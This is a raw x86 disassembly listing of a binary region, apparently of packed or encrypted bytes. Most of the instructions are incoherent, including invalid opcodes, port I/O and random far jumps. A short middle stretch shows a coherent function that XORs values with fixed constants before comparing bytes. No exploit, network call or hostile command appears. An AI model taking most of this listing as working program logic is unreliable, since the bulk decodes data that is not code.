  4056e6:	fisubr WORD PTR ds:0xd2495677
  4056ec:	xor    eax,0x4b33d805
  4056f1:	dec    ecx
  4056f2:	jno    0x4056bd
  4056f4:	mov    ds:0xe0b8452e,eax
  4056f9:	mov    ebx,0x5c0da84c
  4056fe:	ror    BYTE PTR [edx-0x5958e4f9],cl
  405704:	std    
  405705:	enter  0xafbb,0xc7
  405709:	aam    0x24
  40570b:	ror    BYTE PTR [esi+0x503437a2],cl
  405711:	in     eax,0x58
  405713:	enter  0x6e4,0xc
  405717:	cmp    ah,BYTE PTR [ecx+eiz*8+0x5b]
  40571b:	jo     0x405788
  40571d:	iret   
  40571e:	cmp    BYTE PTR [esi+eax*4+0x1807a985],0xa1
  405726:	aad    0x5a
  405728:	mov    ecx,0x57714fae
  40572d:	into   
  40572e:	mov    ebx,0x405c9ab1
  405733:	mov    ?,WORD PTR [ebx-0x4b6e75c9]
  405739:	cdq    
  40573a:	jmp    0xb3d3add3
  40573f:	or     BYTE PTR [ebx+0x502e7249],dl
  405745:	lods   eax,DWORD PTR ds:[esi]
  405746:	sub    eax,0xeaf0bd99
  40574b:	aam    0xf7
  40574d:	and    ecx,ebx
  40574f:	cmc    
  405750:	lahf   
  405751:	mov    bh,0xa4
  405753:	and    bh,BYTE PTR [eax-0x10]
  405756:	shr    BYTE PTR [esi],cl
  405758:	sbb    DWORD PTR [eax-0x31709572],edi
  40575e:	neg    cl
  405760:	cmp    DWORD PTR [edx+ecx*1-0x3d],edx
  405764:	or     al,0x22
  405766:	adc    eax,0x1b71c9c4
  40576b:	pop    edi
  40576c:	out    0x90,eax
  40576e:	inc    ecx
  40576f:	fmul   QWORD PTR [edi+0x2f]
  405772:	jg     0x4057bb
  405774:	leave  
  405775:	jnp    0x40572a
  405777:	push   ecx
  405778:	loope  0x405730
  40577a:	lea    edi,[edi]
  40577c:	(bad)  
  40577d:	or     eax,0x91e4545c
  405782:	je     0x405779
  405784:	aad    0xe2
  405786:	push   0x3a
  405788:	rcr    al,cl
  40578a:	xor    eax,DWORD PTR [esp+ebp*4+0x64]
  40578e:	int    0x6d
  405790:	fpatan 
  405792:	dec    edi
  405793:	xchg   esi,eax
  405794:	out    dx,eax
  405795:	jns    0x405752
  405797:	jmp    FWORD PTR [ebp+0x7c8e25b9]
  40579d:	pop    esi
  40579e:	int3   
  40579f:	lods   eax,DWORD PTR ds:[esi]
  4057a0:	cmp    esi,ecx
  4057a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057a3:	sbb    BYTE PTR [esi+eax*1],bl
  4057a6:	mov    ebp,0xa36982cb
  4057ab:	pop    es
  4057ac:	sahf   
  4057ad:	xchg   edi,eax
  4057ae:	in     al,dx
  4057af:	(bad)  
  4057b1:	addr16 hlt 
  4057b3:	push   DWORD PTR [ebp+0x4bead322]
  4057b9:	push   es
  4057ba:	daa    
  4057bb:	push   cx
  4057bd:	fadd   QWORD PTR [edx]
  4057bf:	xor    eax,0x21fbecf5
  4057c4:	mov    al,ds:0xbfa2efd7
  4057c9:	je     0x405842
  4057cb:	mov    al,ds:0xd247328d
  4057d0:	scas   al,BYTE PTR es:[edi]
  4057d1:	pop    ebx
  4057d2:	mov    ah,0x80
  4057d4:	cmp    DWORD PTR [eax+eax*2-0x7c],ebp
  4057d8:	jno    0x40578d
  4057da:	sti    
  4057db:	xor    al,0x3e
  4057dd:	add    dh,BYTE PTR [ebx-0x5e]
  4057e0:	xor    eax,edx
  4057e2:	inc    ebp
  4057e3:	and    DWORD PTR [edx-0x6b],edx
  4057e6:	iret   
  4057e7:	test   DWORD PTR [edi-0x1d4f3504],0x75e2dec3
  4057f1:	jmp    0x4169845
  4057f6:	in     al,0xac
  4057f8:	repz add esp,esp
  4057fb:	bound  edx,QWORD PTR [ecx-0x2ff78b66]
  405801:	addr16 push es
  405803:	pop    esi
  405804:	add    DWORD PTR [ecx-0x39b4b867],0x6e
  40580b:	and    al,BYTE PTR [edi-0x21]
  40580e:	mov    esp,0x60b79e49
  405813:	mov    BYTE PTR [eax+esi*1+0x3a56e0bb],bl
  40581a:	in     eax,0xae
  40581c:	cmc    
  40581d:	fadd   st,st(6)
  40581f:	sub    BYTE PTR [ecx+eiz*8-0x3e44b856],cl
  405826:	jmp    0x47f11dc9
  40582b:	mov    eax,ds:0x85133505
  405830:	mov    ah,0xda
  405832:	loop   0x4058b1
  405834:	dec    edi
  405835:	push   ebp
  405836:	xor    edi,DWORD PTR [edi-0x3c27e236]
  40583c:	add    edi,edx
  40583e:	pusha  
  40583f:	lods   al,BYTE PTR ds:[esi]
  405840:	sahf   
  405841:	inc    ecx
  405842:	push   ds
  405843:	pop    edi
  405844:	daa    
  405845:	les    ecx,FWORD PTR [edx+ecx*2]
  405848:	add    esi,DWORD PTR [ecx+0x4800a12a]
  40584e:	pusha  
  40584f:	scas   al,BYTE PTR es:[edi]
  405850:	sti    
  405851:	mov    dl,0xef
  405853:	ja     0x4057fd
  405855:	adc    eax,0xb40256d9
  40585a:	sub    ah,bl
  40585c:	sub    al,0x1c
  40585e:	adc    ah,dl
  405860:	ret    
  405861:	add    ebp,DWORD PTR [ebp+0x62c591c]
  405867:	dec    ebp
  405868:	repz inc edi
  40586a:	inc    eax
  40586b:	lock mov ah,0x0
  40586e:	ds xchg ebp,edx
  405871:	mov    ebp,0x10660743
  405876:	jno    0x40583b
  405878:	add    BYTE PTR [ebp-0x6f7f2773],ah
  40587e:	adc    al,0x26
  405880:	test   BYTE PTR [esi],0x99
  405883:	xchg   esp,eax
  405884:	sub    eax,0x8127ac35
  405889:	add    bl,bl
  40588b:	das    
  40588c:	sub    al,0x72
  40588e:	inc    eax
  40588f:	js     0x405898
  405891:	pop    ds
  405892:	das    
  405893:	mov    ch,0xc3
  405895:	stos   BYTE PTR es:[edi],al
  405896:	std    
  405897:	jb     0x4058aa
  405899:	fisubr DWORD PTR [esi+0x30152bcd]
  40589f:	pop    ecx
  4058a0:	scas   eax,DWORD PTR es:[edi]
  4058a1:	dec    eax
  4058a2:	mov    esi,0x82fd1bdf
  4058a7:	mov    ch,0xe2
  4058a9:	aad    0xc3
  4058ab:	inc    edx
  4058ac:	test   al,0x10
  4058ae:	sub    DWORD PTR [ebp-0x7b2d6f54],edx
  4058b4:	and    eax,0x8b35e0ae
  4058b9:	ja     0x4058b3
  4058bb:	mov    ebp,0xc57af017
  4058c0:	ficomp WORD PTR [edi+ecx*2]
  4058c3:	mov    al,ds:0xf371073c
  4058c8:	pop    es
  4058c9:	bound  esi,QWORD PTR [eax+0x6faef00a]
  4058cf:	mov    ecx,0x6228fbb5
  4058d4:	xlat   BYTE PTR ds:[ebx]
  4058d5:	xlat   BYTE PTR ds:[ebx]
  4058d6:	fwait
  4058d7:	push   eax
  4058d8:	les    edx,FWORD PTR [edi+0x4e]
  4058db:	mov    edi,0xba188d52
  4058e0:	xchg   ecx,eax
  4058e1:	ds jle 0x405940
  4058e4:	fisttp QWORD PTR [eax]
  4058e6:	sbb    al,BYTE PTR [ecx]
  4058e8:	mov    WORD PTR [ebp-0x13ad32f3],?
  4058ee:	cmp    eax,ebx
  4058f0:	lahf   
  4058f1:	jge    0x4058e4
  4058f3:	dec    eax
  4058f4:	imul   edi,DWORD PTR [eax],0x39
  4058f7:	mov    ecx,0xeb595619
  4058fc:	cmp    eax,DWORD PTR [esi-0x5d]
  4058ff:	or     BYTE PTR [edx-0x1e],0xe8
  405903:	out    0xa3,eax
  405905:	xchg   BYTE PTR [esi+ebx*2],al
  405908:	out    dx,al
  405909:	mov    WORD PTR [eax],fs
  40590b:	jbe    0x405922
  40590d:	xor    ah,ch
  40590f:	add    eax,0x76d02aa2
  405914:	pop    ecx
  405915:	aaa    
  405916:	outs   dx,DWORD PTR ds:[esi]
  405917:	inc    edx
  405918:	mov    dl,0xfc
  40591a:	(bad)  
  40591b:	sub    edi,edx
  40591d:	inc    ecx
  40591e:	mov    ebp,0x40d81c34
  405923:	cmp    ebx,edi
  405925:	jo     0x4058b5
  405927:	xchg   ebx,eax
  405928:	fwait
  405929:	outs   dx,BYTE PTR ds:[esi]
  40592a:	push   esp
  40592b:	push   cs
  40592c:	pop    ecx
  40592d:	push   0x3b
  40592f:	pop    edx
  405930:	cld    
  405931:	cmp    eax,0xd05f405
  405936:	pop    es
  405937:	cmp    esp,DWORD PTR [ebx]
  405939:	out    0xf2,eax
  40593b:	jp     0x40590b
  40593d:	adc    BYTE PTR [ecx+0x1622408d],dh
  405943:	adc    bh,bh
  405945:	xor    eax,DWORD PTR [edi+0x622b1d96]
  40594b:	sub    ah,BYTE PTR [esi]
  40594d:	dec    eax
  40594e:	cld    
  40594f:	cmp    DWORD PTR [ebx+0x68e61c3],esi
  405955:	pop    ss
  405956:	mov    esi,0xc08d2e98
  40595b:	xchg   ecx,eax
  40595c:	jbe    0x40595c
  40595e:	imul   ebp,DWORD PTR [edi-0x79a72a10],0xffffffb1
  405965:	(bad)  
  405967:	pop    ecx
  405968:	aaa    
  405969:	jmp    0x4058f4
  40596b:	jmp    0x431a:0xbdf5a5fb
  405972:	cmp    ah,al
  405974:	pop    ds
  405975:	xchg   edi,eax
  405976:	jp     0x40593f
  405978:	mov    WORD PTR [esi],ds
  40597a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40597b:	add    eax,0x5d884a3c
  405980:	dec    ebp
  405981:	or     al,0xe4
  405983:	retf   0x8f0b
  405986:	cmp    BYTE PTR [edx+0x44292425],bl
  40598c:	outs   dx,DWORD PTR ds:[esi]
  40598d:	aaa    
  40598e:	pop    ss
  40598f:	bnd jge 0x40599c
  405992:	pusha  
  405993:	sbb    eax,0x2f4add11
  405998:	mov    edx,DWORD PTR [esi]
  40599a:	pop    ds
  40599b:	ins    BYTE PTR es:[edi],dx
  40599c:	(bad)  
  40599e:	inc    esi
  40599f:	es inc edi
  4059a1:	pop    eax
  4059a2:	sub    BYTE PTR [edx],bh
  4059a4:	call   0x1af0:0x2ca53bfa
  4059ab:	fdivr  st,st(5)
  4059ad:	push   ebp
  4059ae:	lods   eax,DWORD PTR ds:[esi]
  4059af:	add    bh,cl
  4059b1:	fs jns 0x405a28
  4059b4:	(bad)  
  4059b5:	fdivp  st(5),st
  4059b7:	mov    dl,0x95
  4059b9:	rol    ch,0x96
  4059bc:	jp     0x4059bd
  4059be:	icebp  
  4059bf:	mov    ds:0xc5026cb3,al
  4059c4:	mov    ah,0x8c
  4059c6:	in     eax,dx
  4059c7:	inc    edx
  4059c8:	and    eax,0x89c73008
  4059cd:	jb     0x40596a
  4059cf:	ja     0x405a43
  4059d1:	and    BYTE PTR [ecx-0x27be7979],ch
  4059d7:	retf   0x8356
  4059da:	icebp  
  4059db:	xor    al,0x64
  4059dd:	jl     0x405a0b
  4059df:	imul   esi,DWORD PTR [esi-0x22],0xffffff8e
  4059e3:	adc    al,0x11
  4059e5:	jp     0x405a35
  4059e7:	(bad)
  4059ea:	lock test eax,0x5fbc7208
  4059f0:	or     eax,DWORD PTR [ebx]
  4059f2:	pusha  
  4059f3:	jno    0x405997
  4059f5:	call   0x957:0xc547fb1c
  4059fc:	into   
  4059fd:	shr    BYTE PTR [ebp-0x58d93705],cl
  405a03:	pop    edi
  405a04:	nop
  405a05:	in     eax,dx
  405a06:	jne    0x405995
  405a08:	inc    eax
  405a09:	das    
  405a0a:	push   esi
  405a0b:	push   esp
  405a0c:	fdivr  DWORD PTR [edi-0x20e97ce9]
  405a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a13:	in     eax,0x3a
  405a15:	jge    0x405a4d
  405a17:	ds sub eax,0xefaa3d6
  405a1d:	xchg   ecx,eax
  405a1e:	aaa    
  405a1f:	mov    ecx,0x14284997
  405a24:	int3   
  405a25:	or     bl,ch
  405a27:	cmc    
  405a28:	sahf   
  405a29:	std    
  405a2a:	add    ebp,DWORD PTR ds:0x50e70953
  405a30:	leave  
  405a31:	xor    BYTE PTR [ecx+0x1a],bl
  405a34:	jle    0x405aa0
  405a36:	stos   DWORD PTR es:[edi],eax
  405a37:	mov    ecx,0x19ea64d0
  405a3c:	fucom  st(4)
  405a3e:	add    ebp,DWORD PTR [esi-0x15b45d41]
  405a44:	pop    ebp
  405a45:	addr16 loope 0x405aa7
  405a48:	outs   dx,BYTE PTR ds:[esi]
  405a49:	jbe    0x405ab0
  405a4b:	mov    edi,0xd59adf9d
  405a50:	aam    0xaf
  405a52:	cli    
  405a53:	sbb    DWORD PTR ds:0x34d3cf9d,0x46dab582
  405a5d:	pop    esp
  405a5e:	repz cmc 
  405a60:	jae    0x405aa3
  405a62:	icebp  
  405a63:	aaa    
  405a64:	rcl    DWORD PTR [esp+ebx*1],cl
  405a67:	adc    BYTE PTR [ebx],bl
  405a69:	arpl   si,cx
  405a6b:	jmp    0x4247:0xd08e8e6f
  405a72:	cwde   
  405a73:	popf   
  405a74:	pop    esi
  405a75:	shl    BYTE PTR [ecx],cl
  405a77:	inc    eax
  405a78:	pop    ecx
  405a79:	adc    ah,bl
  405a7b:	jp     0x405ad6
  405a7d:	mov    dh,BYTE PTR ds:0x28a22634
  405a83:	and    DWORD PTR [ecx+0x76757613],ecx
  405a89:	out    dx,eax
  405a8a:	push   es
  405a8b:	dec    esp
  405a8c:	push   esp
  405a8d:	pop    edi
  405a8e:	mov    ebp,DWORD PTR [edx]
  405a90:	sbb    ebp,ebp
  405a92:	jmp    0x405a64
  405a94:	je     0x405af2
  405a96:	inc    ecx
  405a97:	mov    ecx,0xb2dcd8df
  405a9c:	add    al,0x41
  405a9e:	pavgw  mm7,QWORD PTR [ecx]
  405aa1:	data16 scas al,BYTE PTR es:[edi]
  405aa3:	ins    BYTE PTR es:[edi],dx
  405aa4:	idiv   BYTE PTR [ebx+0x6c71629b]
  405aaa:	in     al,0x87
  405aac:	dec    esi
  405aad:	jae    0x405b05
  405aaf:	cli    
  405ab0:	iret   
  405ab1:	lock lds esp,FWORD PTR [eax]
  405ab4:	popf   
  405ab5:	push   esp
  405ab6:	sub    dh,BYTE PTR [esi+0x1a]
  405ab9:	loopne 0x405aee
  405abb:	leave  
  405abc:	inc    BYTE PTR [ebx]
  405abe:	std    
  405abf:	push   0xffffffdf
  405ac1:	sub    BYTE PTR [ebp+0x67],bl
  405ac4:	sti    
  405ac5:	in     eax,dx
  405ac6:	data16 jp 0x405a54
  405ac9:	dec    ebp
  405aca:	hlt    
  405acb:	mov    edx,DWORD PTR [ebp+0x8]
  405ace:	mov    dl,BYTE PTR [ebp+edx*1-0x50]
  405ad2:	mov    ebx,DWORD PTR [ebp+0xc]
  405ad5:	xor    ecx,0x751018b5
  405adb:	cmp    dl,BYTE PTR [ebx+ecx*1+0x376272fb]
  405ae2:	jne    0x405b4b
  405ae8:	mov    ecx,DWORD PTR [ebp-0xc]
  405aeb:	mov    edx,DWORD PTR [ebp-0x20]
  405aee:	mov    ebx,DWORD PTR [ebp-0x1c]
  405af1:	mov    ebx,DWORD PTR [ebp+0xc]
  405af4:	xor    dl,0x4b
  405af7:	xor    ecx,0x751018b5
  405afd:	add    dl,0x37
  405b00:	cmp    BYTE PTR [ebx+ecx*1+0x376272fb],dl
  405b07:	je     0x405b3c
  405b0d:	mov    ecx,DWORD PTR [ebp-0x30]
  405b10:	mov    edx,DWORD PTR [ebp-0x2c]
  405b13:	mov    edx,DWORD PTR [ebp+0x8]
  405b16:	xor    ecx,eax
  405b18:	lea    ecx,[ecx+edx*1+0x56424137]
  405b1f:	mov    DWORD PTR [ebp+0x8],ecx
  405b22:	mov    ecx,DWORD PTR [ebp-0x18]
  405b25:	mov    edx,DWORD PTR [ebp-0x14]
  405b28:	xor    edx,edi
  405b2a:	xor    ecx,eax
  405b2c:	add    ecx,esi
  405b2e:	adc    edx,0x5765
  405b34:	or     ecx,edx
  405b36:	jne    0x4036df
  405b3c:	mov    ecx,DWORD PTR [ebp-0x30]
  405b3f:	mov    edx,DWORD PTR [ebp-0x2c]
  405b42:	xor    ecx,eax
  405b44:	mov    eax,DWORD PTR [ebp+0x10]
  405b47:	add    ecx,esi
  405b49:	mov    DWORD PTR [eax],ecx
  405b4b:	pop    edi
  405b4c:	pop    esi
  405b4d:	pop    ebx
  405b4e:	leave  
  405b4f:	ret    0xc
  405b52:	mov    eax,0xd60a9455
  405b57:	mov    edx,0xffff2df0
  405b5c:	ret    
  405b5d:	mov    eax,0xd63de40a
  405b62:	jmp    0x407eba
  405b67:	jmp    0xeaf4:0x85c585f6
  405b6e:	hlt    
  405b6f:	out    0x5,al
  405b71:	(bad)  
  405b72:	adc    esi,DWORD PTR [ebx+0x57bfee33]
  405b78:	mov    ebp,0x98b07b7b
  405b7d:	jnp    0x405bfa
  405b7f:	cmp    al,0xd1
  405b81:	xor    ebx,DWORD PTR [eax-0x26036c9a]
  405b87:	loope  0x405b95
  405b89:	xchg   DWORD PTR [eiz*2+0x18e551f3],edi
  405b90:	cmp    edx,DWORD PTR [edx+0x16fc4067]
  405b96:	outs   dx,DWORD PTR ds:[esi]
  405b97:	push   ds
  405b98:	jbe    0x405b3c
  405b9a:	aaa    
  405b9b:	xor    DWORD PTR [edx+0x69f89ef4],edi
  405ba1:	mov    DWORD PTR [edx],ecx
  405ba3:	pop    edi
  405ba4:	xlat   BYTE PTR ds:[ebx]
  405ba5:	push   eax
  405ba6:	push   ss
  405ba7:	fldl2t 
  405ba9:	push   ss
  405baa:	xchg   esi,eax
  405bab:	and    eax,0xb071730f
  405bb0:	outs   dx,BYTE PTR ds:[esi]
  405bb1:	inc    ecx
  405bb2:	gs loop 0x405be2
  405bb5:	sub    BYTE PTR [edx+0x3fe36f14],al
  405bbb:	dec    eax
  405bbc:	ret    0xf82f
  405bbf:	fist   WORD PTR [ecx+0x73]
  405bc2:	inc    ebp
  405bc3:	in     eax,0x63
  405bc5:	stos   BYTE PTR es:[edi],al
  405bc6:	scas   eax,DWORD PTR es:[edi]
  405bc7:	call   DWORD PTR [esi+edi*1]
  405bca:	add    BYTE PTR [ecx-0x7aa2de97],dh
  405bd0:	ja     0x405c02
  405bd2:	xchg   ebp,eax
  405bd3:	popa   
  405bd4:	shr    DWORD PTR [ebx],cl
  405bd6:	test   DWORD PTR [esi-0x2f],ebp
  405bd9:	dec    esi
  405bda:	push   cs
  405bdb:	nop
  405bdc:	int3   
  405bdd:	fld    DWORD PTR [ebp+ebx*4-0x2c5bd252]
  405be4:	mov    bh,0x11
  405be6:	push   eax
  405be7:	xor    eax,0x16822586
  405bec:	sub    BYTE PTR [edx+0x5c],al
  405bef:	dec    edx
  405bf0:	pop    esi
  405bf1:	sub    cl,BYTE PTR [ebx+0x65b5b56e]
  405bf7:	out    dx,eax
  405bf8:	(bad)  
  405bf9:	fs xchg ecx,eax
  405bfb:	sub    BYTE PTR [eax-0x31a4cf9b],dh
  405c01:	scas   eax,DWORD PTR es:[edi]
  405c02:	add    al,0x53
  405c04:	xchg   ebp,eax
  405c05:	mov    ds:0x431e112d,eax
  405c0a:	repnz arpl dx,dx
  405c0d:	js     0x405c07
  405c0f:	inc    edx
  405c10:	or     BYTE PTR [ebp+0x65ea289c],0xa8
  405c17:	out    dx,al
  405c18:	scas   eax,DWORD PTR es:[edi]
  405c19:	in     al,dx
  405c1a:	push   es
  405c1b:	jbe    0x405c8a
  405c1d:	pushf  
  405c1e:	ds pop esi
  405c20:	retf   
  405c21:	outs   dx,BYTE PTR ds:[esi]
  405c22:	sbb    cl,BYTE PTR [edi-0x2d]
  405c25:	xor    eax,esi
  405c27:	aam    0xd9
  405c29:	dec    BYTE PTR [edi]
  405c2b:	in     eax,0xaf
  405c2d:	shl    DWORD PTR [edx],cl
  405c2f:	std    
  405c30:	lea    ebx,es:[eax+0x71]
  405c34:	scas   al,BYTE PTR es:[edi]
  405c35:	(bad)  
  405c36:	push   0xfa3ec9bd
  405c3b:	lods   al,BYTE PTR ds:[esi]
  405c3c:	sbb    dl,bl
  405c3e:	add    DWORD PTR [esi-0x6ccec88e],edx
  405c44:	or     DWORD PTR [eax],ebx
  405c46:	pop    ebx
  405c47:	mov    esp,0x41fdd48
  405c4c:	push   ebx
  405c4d:	sbb    ah,BYTE PTR [ebp-0x1b]
  405c50:	imul   DWORD PTR [ebx-0x176012b6]
  405c56:	or     dl,cl
  405c58:	jmp    0xf03e:0xe41e14c6
  405c5f:	push   ebp
  405c60:	es (bad) 
  405c62:	leave  
  405c63:	pop    ecx
  405c64:	imul   esi,ecx,0xffffffce
  405c67:	test   BYTE PTR [edx+0x7c6b4fb2],bh
  405c6d:	dec    edx
  405c6e:	sbb    edx,edi
  405c70:	daa    
  405c71:	div    DWORD PTR [esi-0x38]
  405c74:	aam    0x1e
  405c76:	data16 jae 0x405c71
  405c79:	jmp    0x405cb9
  405c7b:	retf   
  405c7c:	or     esp,esi
  405c7e:	sbb    ecx,DWORD PTR ds:0x4dfcfa94
  405c84:	jbe    0x405cb5
  405c86:	(bad)  
  405c87:	lock mov ecx,0xfbc9e2a4
  405c8d:	in     al,dx
  405c8e:	inc    esp
  405c8f:	pop    eax
  405c90:	mov    dl,0x6
  405c92:	push   esp
  405c93:	shl    BYTE PTR [ecx-0x4238c5b8],0x34
  405c9a:	sbb    dl,BYTE PTR [eax+0x130ee0bb]
  405ca0:	lods   eax,DWORD PTR ds:[esi]
  405ca1:	pusha  
  405ca2:	dec    esp
  405ca3:	in     eax,dx
  405ca4:	sbb    cl,BYTE PTR [eax+ebx*1]
  405ca7:	xor    BYTE PTR [eax],al
  405ca9:	push   edx
  405caa:	aas    
  405cab:	sti    
  405cac:	stc    
  405cad:	dec    ebx
  405cae:	or     eax,0x111df19b
  405cb3:	sbb    DWORD PTR [edx-0x52cf1889],ecx
  405cb9:	mov    BYTE PTR [bx+si-0x45a7],cl
  405cbe:	xchg   edi,eax
  405cbf:	enter  0xcc75,0x34
  405cc3:	sti    
  405cc4:	pop    esp
  405cc5:	ds loop 0x405c94
  405cc8:	jnp    0x405ce1
  405cca:	mov    ch,0x3f
  405ccc:	mov    bl,ah
  405cce:	sbb    al,0x55
  405cd0:	dec    edx
  405cd1:	into   
  405cd2:	shr    DWORD PTR [edx+edx*8],1
  405cd5:	es sti 
  405cd7:	cmp    bl,BYTE PTR [ebx-0xd]
  405cda:	mov    ebp,0xf463614
  405cdf:	sbb    DWORD PTR [eax],edi
  405ce1:	or     cl,bh
  405ce3:	jge    0x405cb7
  405ce5:	xor    ch,BYTE PTR [ecx-0x61]
  405ce8:	adc    eax,0xeb612f3f
  405ced:	xor    eax,0xd42f7c23
  405cf2:	retf   
  405cf3:	dec    eax
  405cf4:	and    dl,BYTE PTR ds:0xb0c0a220
  405cfa:	inc    ebp
  405cfb:	in     eax,0x5b
  405cfd:	or     BYTE PTR [edi-0x5543362a],ah
  405d03:	pop    ebp
  405d04:	repnz aad 0x82
  405d07:	push   ss
  405d08:	push   ds
  405d09:	das    
  405d0a:	cmp    edi,eax
  405d0c:	add    BYTE PTR [ecx],ch
  405d0e:	jmp    0xef36:0x3f1c416c
  405d15:	xchg   DWORD PTR [ebp+0x13fac91],esi
  405d1b:	call   0x81ff:0x57b1b2a7
  405d22:	int    0xf7
  405d24:	dec    esi
  405d25:	stc    
  405d26:	bound  edx,QWORD PTR [edi-0x58]
  405d29:	and    DWORD PTR [eax-0x71],ecx
  405d2c:	or     bl,BYTE PTR [ebx+0x16]
  405d2f:	pop    es
  405d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d31:	xchg   edx,eax
  405d32:	scas   al,BYTE PTR es:[edi]
  405d33:	arpl   WORD PTR ds:0x871265b8,ax
  405d39:	aas    
  405d3a:	mov    DWORD PTR [edi+0x52],eax
  405d3d:	and    eax,0x5e5a3f93
  405d42:	fcmovb st,st(0)
  405d44:	cmp    eax,0x30ede1a3
  405d49:	add    DWORD PTR [eax],ebp
  405d4b:	push   es
  405d4c:	jp     0x405d15
  405d4e:	(bad)  
  405d4f:	dec    ebx
  405d50:	adc    DWORD PTR [ecx],eax
  405d52:	mov    bl,BYTE PTR [ebx+0x67dd7c67]
  405d58:	mov    esp,0x5c34436a
  405d5d:	push   edi
  405d5e:	in     eax,dx
  405d5f:	icebp  
  405d60:	repz shl DWORD PTR [eax-0x7b],cl
  405d64:	push   cs
  405d65:	scas   al,BYTE PTR es:[edi]
  405d66:	push   0x73
  405d68:	sub    BYTE PTR [edx-0xb005d55],dl
  405d6e:	mov    edi,0x13357582
  405d73:	lahf   
  405d74:	jmp    0x45a3e849
  405d79:	or     ebp,edi
  405d7b:	mov    DWORD PTR [ebx],0xd295374b
  405d81:	aas    
  405d82:	outs   dx,DWORD PTR ds:[esi]
  405d83:	mov    eax,ds:0x21db76f0
  405d88:	inc    ebx
  405d89:	in     eax,0x3d
  405d8b:	clc    
  405d8c:	inc    esi
  405d8d:	mov    bl,0xef
  405d8f:	pop    esi
  405d90:	imul   BYTE PTR [ecx-0x592be22c]
  405d96:	test   al,0x2b
  405d98:	and    DWORD PTR [edx],0x634fb4e
  405d9e:	les    eax,FWORD PTR [edi]
  405da0:	mov    ds:0x41d86647,eax
  405da5:	(bad)  
  405da6:	mov    ah,0xc6
  405da8:	(bad)  
  405da9:	shr    BYTE PTR [esi+0x7c],cl
  405dac:	or     ecx,DWORD PTR [ecx]
  405dae:	pop    esi
  405daf:	push   ebx
  405db0:	(bad)  
  405db1:	push   ds
  405db2:	mov    ah,0x98
  405db4:	jle    0x405d80
  405db6:	jae    0x405e03
  405db8:	or     eax,0x96e149c4
  405dbd:	cmp    edx,ebp
  405dbf:	jae    0x405d88
  405dc1:	sahf   
  405dc2:	cmp    eax,0xdb2d4c0c
  405dc7:	jecxz  0x405dcb
  405dc9:	call   0x976:0x770d3c39
  405dd0:	xor    DWORD PTR [eax+eiz*8],ebx
  405dd3:	je     0x405e10
  405dd5:	stos   BYTE PTR es:[edi],al
  405dd6:	call   0x23dedf4f
  405ddb:	mov    ch,0xe9
  405ddd:	mov    dh,0x35
  405ddf:	mov    eax,ds:0xf13cb385
  405de4:	scas   al,BYTE PTR es:[edi]
  405de5:	clc    
  405de6:	cmp    BYTE PTR [ebx-0x1a69e2b1],cl
  405dec:	fwait
  405ded:	or     DWORD PTR [esi-0xe],ebx
  405df0:	add    al,BYTE PTR [ebp+0x5837bdef]
  405df6:	into   
  405df7:	dec    edx
  405df8:	shl    DWORD PTR [edx],1
  405dfa:	scas   al,BYTE PTR es:[edi]
  405dfb:	xchg   BYTE PTR [ecx+0x5ea09d62],cl
  405e01:	adc    eax,0x603b6719
  405e06:	iret   
  405e07:	icebp  
  405e08:	ret    
  405e09:	jge    0x405e56
  405e0b:	repz mov dl,0xa8
  405e0e:	jecxz  0x405e4f
  405e10:	mov    ch,0x9f
  405e12:	push   eax
  405e13:	in     eax,dx
  405e14:	mov    al,0xf0
  405e16:	adc    BYTE PTR [edi+0x68],ch
  405e19:	popf   
  405e1a:	out    dx,al
  405e1b:	ins    BYTE PTR es:[edi],dx
  405e1c:	(bad)  [edi+0x6079e3ac]
  405e22:	stos   DWORD PTR es:[edi],eax
  405e23:	push   ecx
  405e24:	adc    esp,ebx
  405e26:	mov    al,ss:0x1b5f1ab6
  405e2c:	sub    DWORD PTR ds:0xdda019d0,ebp
  405e32:	add    DWORD PTR [ecx],ebp
  405e34:	mov    eax,DWORD PTR [esi+ebx*4+0x36940c91]
  405e3b:	fcmovnb st,st(7)
  405e3d:	call   0x417c:0xcf01b2fc
  405e44:	sbb    bh,BYTE PTR [eax-0x73]
  405e47:	fist   WORD PTR [esi*8-0x57cb3cb3]
  405e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e4f:	push   ecx
  405e50:	(bad)  
  405e51:	sub    dh,dh
  405e53:	repnz adc ebx,DWORD PTR [ecx+0xe]
  405e57:	pop    edx
  405e58:	mov    ds:0xdb22b95a,al
  405e5d:	es cli 
  405e5f:	pushf  
  405e60:	inc    ebp
  405e61:	pop    ss
  405e62:	jmp    0xa3ab93f9
  405e67:	pop    ss
  405e68:	push   0xfffffffb
  405e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e6b:	outs   dx,BYTE PTR ds:[esi]
  405e6c:	push   0xffffffbe
  405e6e:	add    ebx,DWORD PTR [edi+esi*4]
  405e71:	sub    dl,BYTE PTR [esi-0x32]
  405e74:	pop    ebx
  405e75:	ins    BYTE PTR es:[edi],dx
  405e76:	adc    DWORD PTR [esi-0x7af92a02],ebx
  405e7c:	int    0x4d
  405e7e:	test   bh,ch
  405e80:	sub    BYTE PTR [ecx+0xc],0xd
  405e84:	mov    ds:0xf2793eb7,eax
  405e89:	or     bh,BYTE PTR [esi*2-0x61662b0]
  405e90:	sub    DWORD PTR [ecx],0xb
  405e93:	test   al,0xce
  405e96:	call   0xdd77:0xa3af4848
  405e9d:	test   DWORD PTR [ebx+0x5d],0x68e40340
  405ea4:	xor    eax,0xdbe13f37
  405ea9:	pop    edx
  405eaa:	fidiv  WORD PTR [eax+eax*8+0x51df8218]
  405eb1:	fidivr DWORD PTR [ebx+ebx*8]
  405eb4:	pop    esi
  405eb5:	jecxz  0x405e52
  405eb7:	call   0xb270:0xa8002591
  405ebe:	das    
  405ebf:	mov    DWORD PTR [ecx],ecx
  405ec1:	test   DWORD PTR [edi+0x36e668f0],edx
  405ec7:	xchg   edx,eax
  405ec8:	js     0x405edf
  405eca:	xchg   ebp,eax
  405ecb:	jne    0x405f3e
  405ecd:	cld    
  405ece:	loope  0x405e70
  405ed0:	stos   BYTE PTR es:[edi],al
  405ed1:	adc    bh,bl
  405ed3:	lods   al,BYTE PTR ds:[esi]
  405ed4:	mov    ebx,DWORD PTR [ebx+0x67]
  405ed7:	push   ss
